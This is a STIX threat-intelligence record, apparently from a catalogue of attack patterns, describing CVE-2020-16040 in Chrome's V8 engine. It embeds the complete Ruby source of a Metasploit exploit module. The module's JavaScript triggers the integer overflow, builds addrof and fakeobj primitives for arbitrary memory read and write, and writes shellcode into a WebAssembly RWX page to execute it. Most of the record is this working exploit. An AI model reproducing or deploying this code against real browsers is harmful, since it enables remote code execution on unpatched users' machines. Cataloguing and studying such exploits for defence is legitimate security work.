{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--154af2b5-593a-432a-a23d-e8680e8fd68b",
    "created": "2024-08-14T17:06:08.942651Z",
    "modified": "2024-08-14T17:06:08.942656Z",
    "name": "Google Chrome versions before 87.0.4280.88 integer overflow during SimplfiedLowering phase",
    "description": " This module exploits an issue in Google Chrome versions before 87.0.4280.88 (64 bit). The exploit makes use of an integer overflow in the SimplifiedLowering phase in turbofan. It is used along with a type hardening bypass using ArrayPrototypeShift to create a JSArray with a length of -1. This is abused to gain arbitrary read/write into the isolate region. Then an ArrayBuffer can be used to achieve absolute arbitrary read/write. The exploit then uses WebAssembly in order to allocate a region of RWX memory, which is then replaced with the payload shellcode. The payload is executed within the sandboxed renderer process, the browser must be run with the --no-sandbox option for the payload to work correctly.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/chrome_simplifiedlowering_overflow.rb",
            "external_id": "chrome_simplifiedlowering_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-16040"
        },
        {
            "source_name": "reference",
            "url": "https://chromium-review.googlesource.com/c/v8/v8/+/2557498"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/r4j0x00/exploits/tree/master/CVE-2020-16040"
        },
        {
            "source_name": "reference",
            "url": "https://faraz.faith/2021-01-07-cve-2020-16040-analysis/"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/chromium/issues/detail?id=1150649"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Google Chrome versions before 87.0.4280.88 integer overflow during SimplfiedLowering phase',\n        'Description' => %q{\n          This module exploits an issue in Google Chrome versions before 87.0.4280.88 (64 bit).\n          The exploit makes use of an integer overflow in the SimplifiedLowering phase in turbofan.\n          It is used along with a type hardening bypass using ArrayPrototypeShift to create a JSArray with a length of -1.\n          This is abused to gain arbitrary read/write into the isolate region.\n          Then an ArrayBuffer can be used to achieve absolute arbitrary read/write.\n          The exploit then uses WebAssembly in order to allocate a region of RWX memory, which is then replaced with the payload shellcode.\n          The payload is executed within the sandboxed renderer process, the browser must be run with the --no-sandbox option for the payload to work correctly.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Rajvardhan Agarwal (r4j)', # exploit\n        ],\n        'References' => [\n          ['CVE', '2020-16040'],\n          ['URL', 'https://chromium-review.googlesource.com/c/v8/v8/+/2557498'],\n          ['URL', 'https://github.com/r4j0x00/exploits/tree/master/CVE-2020-16040'],\n          ['URL', 'https://faraz.faith/2021-01-07-cve-2020-16040-analysis/'],\n          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=1150649'],\n        ],\n        'Arch' => [ ARCH_X64 ],\n        'DefaultTarget' => 0,\n        'Payload' => {\n          'Space' => 4096\n        },\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        },\n        'Targets' => [\n          ['Linux - Google Chrome 87.0.4280.66 (64 bit)', { 'Platform' => 'linux' }],\n          ['Windows 10 - Google Chrome 87.0.4280.66 (64 bit)', { 'Platform' => 'win' }],\n          ['macOS - Google Chrome 87.0.4280.66 (64 bit)', { 'Platform' => 'osx' }],\n        ],\n        'DisclosureDate' => '2020-11-19'\n      )\n    )\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Sending #{request.uri} to #{request['User-Agent']}\")\n    shellcode = Rex::Text.to_num(payload.encoded).gsub(/\\r\\n/, '')\n    jscript = <<~JS\n      var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])\n      var wasm_mod = new WebAssembly.Module(wasm_code);\n      var wasm_instance = new WebAssembly.Instance(wasm_mod);\n      var wasm_func = wasm_instance.exports.main;\n\n      var buf = new ArrayBuffer(8);\n      var f64_buf = new Float64Array(buf);\n      var u64_buf = new Uint32Array(buf);\n      var shellcode = new Uint8Array([#{shellcode}]);\n      var shellbuf = new ArrayBuffer(shellcode.length);\n      var dataview = new DataView(shellbuf);\n\n      function ftoi(val) {\n        f64_buf[0] = val;\n        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);\n      }\n\n      function itof(val) {\n        u64_buf[0] = Number(val & 0xffffffffn);\n        u64_buf[1] = Number(val >> 32n);\n        return f64_buf[0];\n      }\n\n      function foo(a) {\n        var y = 0x7fffffff;\n\n        if (a == NaN) y = NaN;\n        if (a) y = -1;\n\n        let z = y + 1;\n        z >>= 31;\n        z = 0x80000000 - Math.sign(z|1);\n\n        if(a) z = 0;\n\n        var arr = new Array(0-Math.sign(z));\n        arr.shift();\n        var cor = [1.1, 1.2, 1.3];\n\n        return [arr, cor];\n      }\n\n      try {\n        for(var i=0;i<0x3000;++i)\n          foo(true);\n\n        var x = foo(false);\n      } catch (e) {\n        location.reload();\n      }\n      var arr = x[0];\n      var cor = x[1];\n\n      const idx = 6;\n      arr[idx+10] = 0x4242;\n\n      function addrof(k) {\n        arr[idx+1] = k;\n        return ftoi(cor[0]) & 0xffffffffn;\n      }\n\n      function fakeobj(k) {\n        cor[0] = itof(k);\n        return arr[idx+1];\n      }\n\n      var float_array_map = ftoi(cor[3]);\n\n      var arr2 = [itof(float_array_map), 1.2, 2.3, 3.4];\n      var fake = fakeobj(addrof(arr2) + 0x20n);\n\n      function arbread(addr) {\n        if (addr % 2n == 0) {\n          addr += 1n;\n        }\n        arr2[1] = itof((2n << 32n) + addr - 8n);\n        return ftoi(fake[0]);\n      }\n\n      function arbwrite(addr, val) {\n        if (addr % 2n == 0) {\n          addr += 1n;\n        }\n        arr2[1] = itof((2n << 32n) + addr - 8n);\n        fake[0] = itof(BigInt(val));\n      }\n\n      function copy_shellcode(addr, shellcode) {\n        let buf_addr = addrof(shellbuf);\n        let backing_store_addr = buf_addr + 0x14n;\n        arbwrite(backing_store_addr, addr);\n\n        for (let i = 0; i < shellcode.length; i++) {\n          dataview.setUint8(i, shellcode[i]);\n        }\n      }\n\n      var rwx_page_addr = arbread(addrof(wasm_instance) + 0x68n);\n      copy_shellcode(rwx_page_addr, shellcode);\n      wasm_func();\n    JS\n\n    html = <<~HTML\n      <html>\n      <head>\n      <script>\n      #{jscript}\n      </script>\n      </head>\n      <body>\n      </body>\n      </html>\n    HTML\n    send_response(cli, html, { 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-11-19"
}